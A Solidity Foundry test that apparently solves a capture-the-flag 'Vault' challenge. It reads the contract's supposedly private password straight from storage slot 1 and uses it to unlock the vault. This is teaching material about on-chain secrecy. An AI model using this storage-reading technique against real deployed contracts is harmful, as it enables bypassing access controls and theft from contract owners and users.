// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/08_vault.sol";

interface CheatCodes {
    // Loads a storage slot from an address
    function load(address account, bytes32 slot) external returns (bytes32);
}

contract AttackerVaultTest is Test {
    CheatCodes constant cheats = CheatCodes(HEVM_ADDRESS);

    function testVault(bytes32 passwd) external {
        vm.prank(address(0x1));
        Vault vault = new Vault(passwd);

        bytes32 pass = cheats.load(address(vault), bytes32(uint256(1)));
        emit log_bytes32(pass);

        console.log("Vault status:", vault.locked());
        assertTrue(vault.locked());

        vault.unlock(pass);

        assertFalse(vault.locked());
        console.log("Vault status:", vault.locked());
    }
}
